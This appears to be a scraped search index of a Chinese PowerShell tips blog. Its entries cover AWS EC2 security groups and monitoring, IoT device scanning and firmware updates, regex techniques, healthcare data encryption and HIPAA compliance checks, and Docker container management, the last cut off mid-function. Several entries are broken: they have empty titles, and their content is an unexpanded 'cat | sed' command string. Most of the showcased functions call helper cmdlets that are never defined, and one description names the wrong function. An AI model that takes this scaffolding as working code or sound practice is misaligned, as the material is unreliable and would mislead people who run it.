$status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Configurations = @{} Issues = @() } # 应用安全组配置 $typeConfig = Apply-SecurityGroupConfig ` -Config $config ` -Type $type ` -Mode $SecurityGroupMode ` -Settings $SecurityGroupConfig $status.Config = $typeConfig # 配置安全组 $configurations = Configure-SecurityGroupResources ` -Type $type ` -Config $typeConfig $status.Configurations = $configurations $configurator.Configurations[$type] = $configurations # 检查安全组问题 $issues = Check-SecurityGroupIssues ` -Configurations $configurations ` -Config $typeConfig $status.Issues = $issues $configurator.Issues += $issues # 更新安全组状态 if ($issues.Count -gt 0) { $status.Status = &quot;Warning&quot; } else { $status.Status = &quot;Success&quot; } $configurator.SecurityGroupStatus[$type] = $status } # 生成报告 if ($ReportPath) { $report = Generate-SecurityGroupReport ` -Configurator $configurator ` -Config $config $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新配置器状态 $configurator.EndTime = Get-Date return $configurator } catch { Write-Error &quot;安全组配置失败：$_&quot; return $null }} 上面的代码定义了一个名为 Manage-EC2Instances 的PowerShell函数，用于执行特定的自动化任务。该函数封装了一系列操作，使得脚本更加模块化和可重用。 监控分析最后，创建一个用于管理监控分析的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697function Monitor-EC2Performance { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$MonitorID, [Parameter()] [string[]]$MonitorTypes, [Parameter()] [ValidateSet(&quot;Metrics&quot;, &quot;Logs&quot;, &quot;Events&quot;)] [string]$MonitorMode = &quot;Metrics&quot;, [Parameter()] [hashtable]$MonitorConfig, [Parameter()] [string]$ReportPath ) try { $monitor = [PSCustomObject]@{ MonitorID = $MonitorID StartTime = Get-Date MonitorStatus = @{} Metrics = @{} Alerts = @() } # 获取监控配置 $config = Get-MonitorConfig -MonitorID $MonitorID # 管理监控 foreach ($type in $MonitorTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Metrics = @{} Alerts = @() } # 应用监控配置 $typeConfig = Apply-MonitorConfig ` -Config $config ` -Type $type ` -Mode $MonitorMode ` -Settings $MonitorConfig $status.Config = $typeConfig # 收集监控指标 $metrics = Collect-EC2Metrics ` -Type $type ` -Config $typeConfig $status.Metrics = $metrics $monitor.Metrics[$type] = $metrics # 检查监控告警 $alerts = Check-MonitorAlerts ` -Metrics $metrics ` -Config $typeConfig $status.Alerts = $alerts $monitor.Alerts += $alerts # 更新监控状态 if ($alerts.Count -gt 0) { $status.Status = &quot;Warning&quot; } else { $status.Status = &quot;Normal&quot; } $monitor.MonitorStatus[$type] = $status } # 生成报告 if ($ReportPath) { $report = Generate-MonitorReport ` -Monitor $monitor ` -Config $config $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新监控器状态 $monitor.EndTime = Get-Date return $monitor } catch { Write-Error &quot;监控分析失败：$_&quot; return $null }} 使用示例以下是如何使用这些函数来管理AWS EC2的示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137# 管理EC2实例$manager = Manage-EC2Instances -InstanceID &quot;INSTANCE001&quot; ` -InstanceTypes @(&quot;Web&quot;, &quot;Application&quot;, &quot;Database&quot;) ` -OperationMode &quot;Launch&quot; ` -InstanceConfig @{ &quot;Web&quot; = @{ &quot;InstanceType&quot; = &quot;t2.micro&quot; &quot;ImageId&quot; = &quot;ami-0c55b159cbfafe1f0&quot; &quot;KeyName&quot; = &quot;web-key&quot; &quot;SubnetId&quot; = &quot;subnet-0123456789abcdef0&quot; &quot;SecurityGroupIds&quot; = @(&quot;sg-0123456789abcdef0&quot;) &quot;UserData&quot; = &quot;#!/bin/bash`necho 'Hello World' &gt; /var/www/html/index.html&quot; } &quot;Application&quot; = @{ &quot;InstanceType&quot; = &quot;t2.small&quot; &quot;ImageId&quot; = &quot;ami-0c55b159cbfafe1f0&quot; &quot;KeyName&quot; = &quot;app-key&quot; &quot;SubnetId&quot; = &quot;subnet-0123456789abcdef1&quot; &quot;SecurityGroupIds&quot; = @(&quot;sg-0123456789abcdef1&quot;) &quot;UserData&quot; = &quot;#!/bin/bash`napt-get update &amp;&amp; apt-get install -y nginx&quot; } &quot;Database&quot; = @{ &quot;InstanceType&quot; = &quot;t2.medium&quot; &quot;ImageId&quot; = &quot;ami-0c55b159cbfafe1f0&quot; &quot;KeyName&quot; = &quot;db-key&quot; &quot;SubnetId&quot; = &quot;subnet-0123456789abcdef2&quot; &quot;SecurityGroupIds&quot; = @(&quot;sg-0123456789abcdef2&quot;) &quot;UserData&quot; = &quot;#!/bin/bash`napt-get update &amp;&amp; apt-get install -y mysql-server&quot; } } ` -LogPath &quot;C:\\Logs\\instance_management.json&quot;# 配置安全组$configurator = Configure-EC2SecurityGroups -SecurityGroupID &quot;SG001&quot; ` -SecurityGroupTypes @(&quot;Web&quot;, &quot;Database&quot;, &quot;Application&quot;) ` -SecurityGroupMode &quot;Web&quot; ` -SecurityGroupConfig @{ &quot;Web&quot; = @{ &quot;Name&quot; = &quot;web-sg&quot; &quot;Description&quot; = &quot;Security group for web servers&quot; &quot;IngressRules&quot; = @{ &quot;HTTP&quot; = @{ &quot;Protocol&quot; = &quot;tcp&quot; &quot;FromPort&quot; = 80 &quot;ToPort&quot; = 80 &quot;CidrIp&quot; = &quot;0.0.0.0/0&quot; } &quot;HTTPS&quot; = @{ &quot;Protocol&quot; = &quot;tcp&quot; &quot;FromPort&quot; = 443 &quot;ToPort&quot; = 443 &quot;CidrIp&quot; = &quot;0.0.0.0/0&quot; } } &quot;EgressRules&quot; = @{ &quot;All&quot; = @{ &quot;Protocol&quot; = &quot;-1&quot; &quot;FromPort&quot; = -1 &quot;ToPort&quot; = -1 &quot;CidrIp&quot; = &quot;0.0.0.0/0&quot; } } } &quot;Database&quot; = @{ &quot;Name&quot; = &quot;db-sg&quot; &quot;Description&quot; = &quot;Security group for database servers&quot; &quot;IngressRules&quot; = @{ &quot;MySQL&quot; = @{ &quot;Protocol&quot; = &quot;tcp&quot; &quot;FromPort&quot; = 3306 &quot;ToPort&quot; = 3306 &quot;SourceSecurityGroupId&quot; = &quot;sg-0123456789abcdef1&quot; } } &quot;EgressRules&quot; = @{ &quot;All&quot; = @{ &quot;Protocol&quot; = &quot;-1&quot; &quot;FromPort&quot; = -1 &quot;ToPort&quot; = -1 &quot;CidrIp&quot; = &quot;0.0.0.0/0&quot; } } } &quot;Application&quot; = @{ &quot;Name&quot; = &quot;app-sg&quot; &quot;Description&quot; = &quot;Security group for application servers&quot; &quot;IngressRules&quot; = @{ &quot;HTTP&quot; = @{ &quot;Protocol&quot; = &quot;tcp&quot; &quot;FromPort&quot; = 80 &quot;ToPort&quot; = 80 &quot;SourceSecurityGroupId&quot; = &quot;sg-0123456789abcdef0&quot; } &quot;MySQL&quot; = @{ &quot;Protocol&quot; = &quot;tcp&quot; &quot;FromPort&quot; = 3306 &quot;ToPort&quot; = 3306 &quot;SourceSecurityGroupId&quot; = &quot;sg-0123456789abcdef2&quot; } } &quot;EgressRules&quot; = @{ &quot;All&quot; = @{ &quot;Protocol&quot; = &quot;-1&quot; &quot;FromPort&quot; = -1 &quot;ToPort&quot; = -1 &quot;CidrIp&quot; = &quot;0.0.0.0/0&quot; } } } } ` -ReportPath &quot;C:\\Reports\\security_group_configuration.json&quot;# 监控EC2性能$monitor = Monitor-EC2Performance -MonitorID &quot;MONITOR001&quot; ` -MonitorTypes @(&quot;CPU&quot;, &quot;Memory&quot;, &quot;Network&quot;) ` -MonitorMode &quot;Metrics&quot; ` -MonitorConfig @{ &quot;CPU&quot; = @{ &quot;Metrics&quot; = @(&quot;CPUUtilization&quot;, &quot;CPUCreditUsage&quot;) &quot;Threshold&quot; = 80 &quot;Interval&quot; = 60 &quot;Alert&quot; = $true } &quot;Memory&quot; = @{ &quot;Metrics&quot; = @(&quot;MemoryUtilization&quot;, &quot;SwapUtilization&quot;) &quot;Threshold&quot; = 90 &quot;Interval&quot; = 60 &quot;Alert&quot; = $true } &quot;Network&quot; = @{ &quot;Metrics&quot; = @(&quot;NetworkIn&quot;, &quot;NetworkOut&quot;, &quot;NetworkPacketsIn&quot;) &quot;Threshold&quot; = 85 &quot;Interval&quot; = 60 &quot;Alert&quot; = $true } } ` -ReportPath &quot;C:\\Reports\\ec2_monitoring.json&quot; 最佳实践 实施实例管理 配置安全组服务 监控性能指标 保持详细的部署记录 定期进行健康检查 实施监控策略 建立告警机制 保持系统文档更新","link":"/2024/11/18/powershell-aws-ec2-integration/"},{"title":"","text":"$(cat _posts/2024-11-20-powershell-microservice-governance.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/11/20/powershell-microservice-governance/"},{"title":"","text":"$(cat _posts/2024-11-22-powershell-hybrid-cloud-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/11/22/powershell-hybrid-cloud-management/"},{"title":"","text":"$(cat _posts/2024-11-21-powershell-backup-recovery.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/11/21/powershell-backup-recovery/"},{"title":"PowerShell 技能连载 - 物联网设备管理实践","text":"在物联网（IoT）时代，设备管理变得越来越重要。本文将介绍如何使用PowerShell来管理和监控物联网设备，包括设备发现、状态监控、固件更新等功能。 设备发现与管理首先，让我们创建一个用于发现和管理物联网设备的函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889function Find-IoTDevices { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$NetworkRange, [Parameter()] [int]$Port = 1883, [Parameter()] [int]$TimeoutSeconds = 5 ) try { $devices = @() $ipRange = $NetworkRange -replace '\\.\\d+$', '' Write-Host &quot;正在扫描网络 $NetworkRange 中的物联网设备...&quot; -ForegroundColor Yellow for ($i = 1; $i -le 254; $i++) { $ip = &quot;$ipRange.$i&quot; $tcpClient = New-Object System.Net.Sockets.TcpClient try { $result = $tcpClient.BeginConnect($ip, $Port, $null, $null) $success = $result.AsyncWaitHandle.WaitOne($TimeoutSeconds * 1000) if ($success) { $tcpClient.EndConnect($result) $device = [PSCustomObject]@{ IPAddress = $ip Port = $Port Status = &quot;Online&quot; DiscoveryTime = Get-Date } # 尝试获取设备信息 try { $deviceInfo = Get-DeviceInfo -IPAddress $ip $device | Add-Member -NotePropertyName &quot;DeviceType&quot; -NotePropertyValue $deviceInfo.Type $device | Add-Member -NotePropertyName &quot;FirmwareVersion&quot; -NotePropertyValue $deviceInfo.FirmwareVersion } catch { Write-Warning &quot;无法获取设备 $ip 的详细信息：$_&quot; } $devices += $device Write-Host &quot;发现设备：$ip&quot; -ForegroundColor Green } } catch { Write-Debug &quot;设备 $ip 未响应：$_&quot; } finally { $tcpClient.Close() } } return $devices } catch { Write-Error &quot;设备扫描失败：$_&quot; return $null }}function Get-DeviceInfo { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$IPAddress ) try { # 这里应该实现与设备的具体通信协议 # 例如：MQTT、CoAP、HTTP等 $deviceInfo = [PSCustomObject]@{ Type = &quot;Unknown&quot; FirmwareVersion = &quot;Unknown&quot; LastUpdate = Get-Date } return $deviceInfo } catch { Write-Error &quot;获取设备信息失败：$_&quot; throw }} 设备状态监控接下来，创建一个用于监控物联网设备状态的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869function Monitor-IoTDevice { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$DeviceIP, [Parameter()] [string[]]$Metrics = @(&quot;CPU&quot;, &quot;Memory&quot;, &quot;Temperature&quot;, &quot;Network&quot;), [Parameter()] [int]$IntervalSeconds = 60, [Parameter()] [int]$DurationMinutes = 60, [Parameter()] [string]$LogPath ) try { $startTime = Get-Date $endTime = $startTime.AddMinutes($DurationMinutes) $metricsData = @() Write-Host &quot;开始监控设备 $DeviceIP...&quot; -ForegroundColor Yellow while ((Get-Date) -lt $endTime) { $metricPoint = [PSCustomObject]@{ Timestamp = Get-Date } foreach ($metric in $Metrics) { try { switch ($metric) { &quot;CPU&quot; { $metricPoint.CPUUsage = Get-DeviceCPUUsage -IPAddress $DeviceIP } &quot;Memory&quot; { $metricPoint.MemoryUsage = Get-DeviceMemoryUsage -IPAddress $DeviceIP } &quot;Temperature&quot; { $metricPoint.Temperature = Get-DeviceTemperature -IPAddress $DeviceIP } &quot;Network&quot; { $metricPoint.NetworkStats = Get-DeviceNetworkStats -IPAddress $DeviceIP } } } catch { Write-Warning &quot;获取指标 $metric 失败：$_&quot; } } $metricsData += $metricPoint if ($LogPath) { $metricPoint | ConvertTo-Json | Out-File -FilePath $LogPath -Append } Start-Sleep -Seconds $IntervalSeconds } return $metricsData } catch { Write-Error &quot;设备监控失败：$_&quot; return $null }} 固件更新管理最后，创建一个用于管理物联网设备固件更新的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172function Update-DeviceFirmware { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$DeviceIP, [Parameter(Mandatory = $true)] [string]$FirmwarePath, [Parameter()] [switch]$Force, [Parameter()] [int]$TimeoutMinutes = 30 ) try { # 检查设备状态 $deviceStatus = Get-DeviceStatus -IPAddress $DeviceIP if (-not $deviceStatus.IsOnline) { throw &quot;设备 $DeviceIP 当前处于离线状态&quot; } # 检查固件版本 $currentVersion = Get-DeviceFirmwareVersion -IPAddress $DeviceIP $newVersion = Get-FirmwareVersion -FirmwarePath $FirmwarePath if (-not $Force -and $currentVersion -ge $newVersion) { throw &quot;当前固件版本 $currentVersion 已是最新版本&quot; } Write-Host &quot;开始更新设备 $DeviceIP 的固件...&quot; -ForegroundColor Yellow # 备份当前配置 $backupPath = Backup-DeviceConfig -IPAddress $DeviceIP # 上传新固件 $uploadResult = Upload-Firmware -IPAddress $DeviceIP -FirmwarePath $FirmwarePath # 等待设备重启 $startTime = Get-Date $deviceOnline = $false while ((Get-Date) -lt $startTime.AddMinutes($TimeoutMinutes)) { if (Test-DeviceConnection -IPAddress $DeviceIP) { $deviceOnline = $true break } Start-Sleep -Seconds 5 } if (-not $deviceOnline) { throw &quot;设备在超时时间内未能重新上线&quot; } # 验证更新 $updateStatus = Test-FirmwareUpdate -IPAddress $DeviceIP -ExpectedVersion $newVersion return [PSCustomObject]@{ DeviceIP = $DeviceIP OldVersion = $currentVersion NewVersion = $newVersion UpdateTime = Get-Date Status = &quot;Success&quot; BackupPath = $backupPath } } catch { Write-Error &quot;固件更新失败：$_&quot; return $null }} 使用示例以下是如何使用这些函数来管理物联网设备的示例： 1234567891011121314# 发现网络中的物联网设备$devices = Find-IoTDevices -NetworkRange &quot;192.168.1.0/24&quot; -Port 1883# 监控特定设备的状态$metrics = Monitor-IoTDevice -DeviceIP &quot;192.168.1.100&quot; ` -Metrics @(&quot;CPU&quot;, &quot;Memory&quot;, &quot;Temperature&quot;) ` -IntervalSeconds 30 ` -DurationMinutes 60 ` -LogPath &quot;C:\\Logs\\device_metrics.json&quot;# 更新设备固件$updateResult = Update-DeviceFirmware -DeviceIP &quot;192.168.1.100&quot; ` -FirmwarePath &quot;C:\\Firmware\\device_v2.0.bin&quot; ` -Force 最佳实践 实现设备认证和加密通信 定期备份设备配置 实施固件更新前的兼容性检查 建立设备监控告警机制 记录详细的设备操作日志 实现设备分组管理 制定设备故障恢复计划 定期评估设备安全性","link":"/2024/11/25/powershell-iot-device-management/"},{"title":"PowerShell 技能连载 - 正则表达式实战技巧","text":"正则表达式是文本处理的核心工具，PowerShell通过-match和-replace运算符提供原生支持。 123456# 提取日志中的IP地址$logContent = Get-Content app.log -Raw$ipPattern = '\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b'$matches = [regex]::Matches($logContent, $ipPattern)$matches.Value | Select-Object -Unique 模式匹配进阶技巧 使用命名捕获组提取结构化数据：123456789$text = '订单号: INV-2024-0456 金额: ¥1,234.56'$pattern = '订单号:\\s+(?&lt;OrderID&gt;INV-\\d+-\\d+)\\s+金额:\\s+¥(?&lt;Amount&gt;[\\d,]+\\.[\\d]{2})'if ($text -match $pattern) { [PSCustomObject]@{ OrderID = $matches['OrderID'] Amount = $matches['Amount'] -replace ',','' }} 这段PowerShell代码实现了模式匹配进阶技巧功能。通过执行这些命令，可以自动化完成相关操作，提高工作效率。 多行模式处理复杂文本：123456789101112131415161718$multiLineText = @'Server: svr01CPU: 85%Memory: 92%---Server: svr02CPU: 63%Memory: 78%'@$pattern = '(?m)^Server:\\s+(.+)\\nCPU:\\s+(.+)\\nMemory:\\s+(.+)$'[regex]::Matches($multiLineText, $pattern) | ForEach-Object { [PSCustomObject]@{ Server = $_.Groups[1].Value CPU = $_.Groups[2].Value Memory = $_.Groups[3].Value }} 最佳实践： 使用[regex]::Escape()处理特殊字符 通过(?:)语法优化非捕获组 利用RegexOptions枚举加速匹配 使用在线正则测试工具验证模式","link":"/2024/11/26/powershell-regex-handling/"},{"title":"","text":"$(cat _posts/2024-11-27-powershell-openapi-integration.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/11/27/powershell-openapi-integration/"},{"title":"","text":"","link":"/2024/11/29/powershell-blockchain-integration/"},{"title":"","text":"$(cat _posts/2024-12-02-powershell-functions-modules.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n上面的代码定义了一个PowerShell函数，用于封装特定的功能，使其可重用。函数是PowerShell脚本中组织代码的基本单元，可以接受参数、执行操作并返回结果。通过将相关代码组织到函数中，可以提高代码的可读性、可维护性和可重用性。\\n/}pd}p’)","link":"/2024/12/02/powershell-functions-modules/"},{"title":"PowerShell 技能连载 - 医疗健康数据管理","text":"在医疗健康领域，数据管理对于确保患者信息的安全性和可访问性至关重要。本文将介绍如何使用PowerShell构建一个医疗健康数据管理系统，包括数据加密、访问控制、合规性检查等功能。 数据加密首先，让我们创建一个用于管理医疗数据加密的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102function Manage-HealthcareEncryption { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$DataID, [Parameter()] [string[]]$EncryptionTypes, [Parameter()] [ValidateSet(&quot;AES256&quot;, &quot;RSA4096&quot;, &quot;Hybrid&quot;)] [string]$Algorithm = &quot;AES256&quot;, [Parameter()] [hashtable]$EncryptionConfig, [Parameter()] [string]$LogPath, [Parameter()] [switch]$AutoRotate ) try { $manager = [PSCustomObject]@{ DataID = $DataID StartTime = Get-Date EncryptionStatus = @{} Keys = @{} RotationHistory = @() } # 获取数据信息 $data = Get-HealthcareData -DataID $DataID # 管理加密 foreach ($type in $EncryptionTypes) { $encryption = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} KeyInfo = @{} RotationStatus = &quot;Unknown&quot; } # 应用加密配置 $config = Apply-EncryptionConfig ` -Data $data ` -Type $type ` -Algorithm $Algorithm ` -Config $EncryptionConfig $encryption.Config = $config # 管理加密密钥 $keyInfo = Manage-EncryptionKeys ` -Data $data ` -Config $config $encryption.KeyInfo = $keyInfo $manager.Keys[$type] = $keyInfo # 检查密钥状态 $keyStatus = Check-KeyStatus ` -KeyInfo $keyInfo if ($keyStatus.NeedsRotation) { $encryption.Status = &quot;NeedsRotation&quot; # 自动轮换 if ($AutoRotate) { $rotation = Rotate-EncryptionKeys ` -KeyInfo $keyInfo ` -Config $config $encryption.RotationStatus = &quot;Rotated&quot; $manager.RotationHistory += $rotation } } else { $encryption.Status = &quot;Secure&quot; $encryption.RotationStatus = &quot;Current&quot; } $manager.EncryptionStatus[$type] = $encryption } # 记录加密日志 if ($LogPath) { $manager | ConvertTo-Json -Depth 10 | Out-File -FilePath $LogPath } # 更新管理器状态 $manager.EndTime = Get-Date return $manager } catch { Write-Error &quot;数据加密管理失败：$_&quot; return $null }} 访问控制接下来，创建一个用于管理医疗数据访问的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596function Manage-HealthcareAccess { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$ResourceID, [Parameter()] [string[]]$AccessTypes, [Parameter()] [ValidateSet(&quot;Strict&quot;, &quot;Standard&quot;, &quot;Basic&quot;)] [string]$SecurityLevel = &quot;Standard&quot;, [Parameter()] [hashtable]$AccessPolicies, [Parameter()] [string]$LogPath ) try { $manager = [PSCustomObject]@{ ResourceID = $ResourceID StartTime = Get-Date AccessControls = @{} AccessLogs = @() Violations = @() } # 获取资源信息 $resource = Get-HealthcareResource -ResourceID $ResourceID # 管理访问控制 foreach ($type in $AccessTypes) { $control = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Policies = @{} AccessList = @() Restrictions = @{} } # 应用访问策略 $policy = Apply-AccessPolicy ` -Resource $resource ` -Type $type ` -Level $SecurityLevel ` -Policies $AccessPolicies $control.Policies = $policy # 配置访问限制 $restrictions = Set-AccessRestrictions ` -Policy $policy ` -Resource $resource $control.Restrictions = $restrictions # 更新访问列表 $accessList = Update-AccessList ` -Resource $resource ` -Policy $policy $control.AccessList = $accessList # 检查访问违规 $violations = Check-AccessViolations ` -AccessList $accessList ` -Policy $policy if ($violations.Count -gt 0) { $control.Status = &quot;Violation&quot; $manager.Violations += $violations } else { $control.Status = &quot;Compliant&quot; } $manager.AccessControls[$type] = $control } # 记录访问日志 if ($LogPath) { $manager | ConvertTo-Json -Depth 10 | Out-File -FilePath $LogPath } # 更新管理器状态 $manager.EndTime = Get-Date return $manager } catch { Write-Error &quot;访问控制管理失败：$_&quot; return $null }} 合规性检查最后，创建一个用于检查医疗数据合规性的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100function Check-HealthcareCompliance { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$ComplianceID, [Parameter()] [string[]]$ComplianceTypes, [Parameter()] [ValidateSet(&quot;HIPAA&quot;, &quot;GDPR&quot;, &quot;HITECH&quot;)] [string]$Standard = &quot;HIPAA&quot;, [Parameter()] [hashtable]$ComplianceRules, [Parameter()] [string]$ReportPath ) try { $checker = [PSCustomObject]@{ ComplianceID = $ComplianceID StartTime = Get-Date ComplianceStatus = @{} Violations = @() Recommendations = @() } # 获取合规性信息 $compliance = Get-ComplianceInfo -ComplianceID $ComplianceID # 检查合规性 foreach ($type in $ComplianceTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Rules = @{} Violations = @() Score = 0 } # 应用合规性规则 $rules = Apply-ComplianceRules ` -Compliance $compliance ` -Type $type ` -Standard $Standard ` -Rules $ComplianceRules $status.Rules = $rules # 检查违规 $violations = Check-ComplianceViolations ` -Compliance $compliance ` -Rules $rules if ($violations.Count -gt 0) { $status.Status = &quot;NonCompliant&quot; $status.Violations = $violations $checker.Violations += $violations # 生成建议 $recommendations = Generate-ComplianceRecommendations ` -Violations $violations $checker.Recommendations += $recommendations } else { $status.Status = &quot;Compliant&quot; } # 计算合规性评分 $score = Calculate-ComplianceScore ` -Status $status ` -Rules $rules $status.Score = $score $checker.ComplianceStatus[$type] = $status } # 生成报告 if ($ReportPath) { $report = Generate-ComplianceReport ` -Checker $checker ` -Compliance $compliance $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新检查器状态 $checker.EndTime = Get-Date return $checker } catch { Write-Error &quot;合规性检查失败：$_&quot; return $null }} 使用示例以下是如何使用这些函数来管理医疗健康数据的示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869# 管理数据加密$manager = Manage-HealthcareEncryption -DataID &quot;DATA001&quot; ` -EncryptionTypes @(&quot;Patient&quot;, &quot;Clinical&quot;, &quot;Administrative&quot;) ` -Algorithm &quot;AES256&quot; ` -EncryptionConfig @{ &quot;Patient&quot; = @{ &quot;KeySize&quot; = 256 &quot;RotationPeriod&quot; = 90 &quot;BackupEnabled&quot; = $true } &quot;Clinical&quot; = @{ &quot;KeySize&quot; = 256 &quot;RotationPeriod&quot; = 180 &quot;BackupEnabled&quot; = $true } &quot;Administrative&quot; = @{ &quot;KeySize&quot; = 256 &quot;RotationPeriod&quot; = 365 &quot;BackupEnabled&quot; = $true } } ` -LogPath &quot;C:\\Logs\\encryption_management.json&quot; ` -AutoRotate# 管理访问控制$accessManager = Manage-HealthcareAccess -ResourceID &quot;RES001&quot; ` -AccessTypes @(&quot;Patient&quot;, &quot;Provider&quot;, &quot;Administrator&quot;) ` -SecurityLevel &quot;Strict&quot; ` -AccessPolicies @{ &quot;Patient&quot; = @{ &quot;AllowedActions&quot; = @(&quot;View&quot;, &quot;Export&quot;) &quot;RestrictedFields&quot; = @(&quot;SSN&quot;, &quot;Insurance&quot;) &quot;AuditRequired&quot; = $true } &quot;Provider&quot; = @{ &quot;AllowedActions&quot; = @(&quot;View&quot;, &quot;Edit&quot;, &quot;Export&quot;) &quot;RestrictedFields&quot; = @(&quot;SSN&quot;) &quot;AuditRequired&quot; = $true } &quot;Administrator&quot; = @{ &quot;AllowedActions&quot; = @(&quot;View&quot;, &quot;Edit&quot;, &quot;Delete&quot;, &quot;Export&quot;) &quot;RestrictedFields&quot; = @() &quot;AuditRequired&quot; = $true } } ` -LogPath &quot;C:\\Logs\\access_management.json&quot;# 检查合规性$checker = Check-HealthcareCompliance -ComplianceID &quot;COMP001&quot; ` -ComplianceTypes @(&quot;Data&quot;, &quot;Access&quot;, &quot;Security&quot;) ` -Standard &quot;HIPAA&quot; ` -ComplianceRules @{ &quot;Data&quot; = @{ &quot;EncryptionRequired&quot; = $true &quot;RetentionPeriod&quot; = 7 &quot;BackupRequired&quot; = $true } &quot;Access&quot; = @{ &quot;AuthenticationRequired&quot; = $true &quot;AuthorizationRequired&quot; = $true &quot;AuditRequired&quot; = $true } &quot;Security&quot; = @{ &quot;FirewallRequired&quot; = $true &quot;IDSRequired&quot; = $true &quot;LoggingRequired&quot; = $true } } ` -ReportPath &quot;C:\\Reports\\compliance_check.json&quot; 最佳实践 实施数据加密 管理访问控制 检查合规性 保持详细的运行记录 定期进行安全评估 实施安全策略 建立应急响应机制 保持系统文档更新","link":"/2024/12/03/powershell-healthcare-data/"},{"title":"PowerShell 技能连载 - Docker容器管理技巧","text":"在现代应用程序开发中，Docker容器已经成为不可或缺的工具。本文将介绍如何使用PowerShell来管理和操作Docker容器，包括容器生命周期管理、资源监控、网络配置等功能。 容器生命周期管理首先，让我们创建一个用于管理Docker容器生命周期的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156function Manage-DockerContainer { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [ValidateSet('Create', 'Start', 'Stop', 'Remove', 'Restart', 'Pause', 'Resume')] [string]$Action, [Parameter(Mandatory = $true)] [string]$ContainerName, [Parameter()] [string]$Image, [Parameter()] [string[]]$PortMappings, [Parameter()] [string[]]$EnvironmentVariables, [Parameter()] [string[]]$Volumes, [Parameter()] [string]$Network, [Parameter()] [hashtable]$ResourceLimits, [Parameter()] [switch]$AutoRemove, [Parameter()] [switch]$Detached ) try { $containerConfig = [PSCustomObject]@{ Name = $ContainerName Action = $Action Timestamp = Get-Date Status = &quot;Pending&quot; Details = @{} } switch ($Action) { 'Create' { if (-not $Image) { throw &quot;创建容器时必须指定镜像&quot; } $dockerArgs = @( &quot;create&quot; &quot;--name&quot;, $ContainerName ) if ($PortMappings) { foreach ($mapping in $PortMappings) { $dockerArgs += &quot;-p&quot;, $mapping } } if ($EnvironmentVariables) { foreach ($env in $EnvironmentVariables) { $dockerArgs += &quot;-e&quot;, $env } } if ($Volumes) { foreach ($volume in $Volumes) { $dockerArgs += &quot;-v&quot;, $volume } } if ($Network) { $dockerArgs += &quot;--network&quot;, $Network } if ($ResourceLimits) { if ($ResourceLimits.ContainsKey('Memory')) { $dockerArgs += &quot;--memory&quot;, $ResourceLimits.Memory } if ($ResourceLimits.ContainsKey('CpuShares')) { $dockerArgs += &quot;--cpu-shares&quot;, $ResourceLimits.CpuShares } } if ($AutoRemove) { $dockerArgs += &quot;--rm&quot; } if ($Detached) { $dockerArgs += &quot;-d&quot; } $dockerArgs += $Image $result = docker $dockerArgs $containerConfig.Details.Result = $result $containerConfig.Status = 